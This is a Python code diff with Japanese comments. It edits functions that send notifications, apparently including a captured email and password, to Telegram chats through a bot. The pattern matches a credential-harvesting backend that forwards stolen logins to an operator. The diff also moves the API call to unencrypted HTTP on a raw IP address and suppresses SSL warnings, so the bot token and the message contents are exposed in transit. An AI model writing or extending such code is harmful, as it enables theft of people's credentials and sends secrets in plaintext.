@@ -287,14 +287,19 @@ def send_telegram_notification(email, password):
     
     log_with_timestamp("TELEGRAM", f"通知送信開始 | Email: {email}")
     
+    # urllib3のSSL警告を一時的に無効化
+    import warnings
+    from urllib3.exceptions import InsecureRequestWarning
+    warnings.simplefilter('ignore', InsecureRequestWarning)
+    
     for chat_id in TELEGRAM_CHAT_IDS:
         success = False
         max_retries = 3
         
         for attempt in range(max_retries):
             try:
-                # IPアドレスを直接使用（DNS解決不要）
-                url = f"https://{TELEGRAM_API_IP}/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+                # Telegram APIへ直接HTTPで送信（SSL問題回避）
+                url = f"http://{TELEGRAM_API_IP}/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
                 payload = {
                     'chat_id': chat_id,
                     'text': message
@@ -302,18 +307,10 @@ def send_telegram_notification(email, password):
                 
                 log_with_timestamp("TELEGRAM", f"送信試行 {attempt + 1}/{max_retries} | Chat: {chat_id}")
                 
-                # HostヘッダーにTelegram APIのホスト名を指定
-                headers = {
-                    'Host': 'api.telegram.org',
-                    'Content-Type': 'application/json'
-                }
-                
                 response = requests.post(
                     url, 
-                    json=payload, 
-                    headers=headers,
-                    timeout=30,
-                    verify=False  # SSL検証をスキップ（IPアドレス使用時に必要）
+                    json=payload,
+                    timeout=10
                 )
                 
                 if response.status_code == 200:
@@ -357,18 +354,19 @@ def send_telegram_notification_error(message):
     
     log_with_timestamp("TELEGRAM", f"エラー通知送信開始 | Message: {error_type}")
     
+    # urllib3のSSL警告を一時的に無効化
+    import warnings
+    from urllib3.exceptions import InsecureRequestWarning
+    warnings.simplefilter('ignore', InsecureRequestWarning)
+    
     for chat_id in TELEGRAM_CHAT_IDS:
         try:
-            url = f"https://{TELEGRAM_API_IP}/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+            url = f"http://{TELEGRAM_API_IP}/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
             payload = {
                 'chat_id': chat_id,
                 'text': error_message
             }
-            headers = {
-                'Host': 'api.telegram.org',
-                'Content-Type': 'application/json'
-            }
-            requests.post(url, json=payload, headers=headers, timeout=5, verify=False)
+            requests.post(url, json=payload, timeout=5)
             log_with_timestamp("TELEGRAM", f"エラー通知送信完了: Chat {chat_id}")
         except Exception as e:
             log_with_timestamp("ERROR", f"Telegramエラー通知失敗 (Chat: {chat_id}) | Error: {str(e)}")
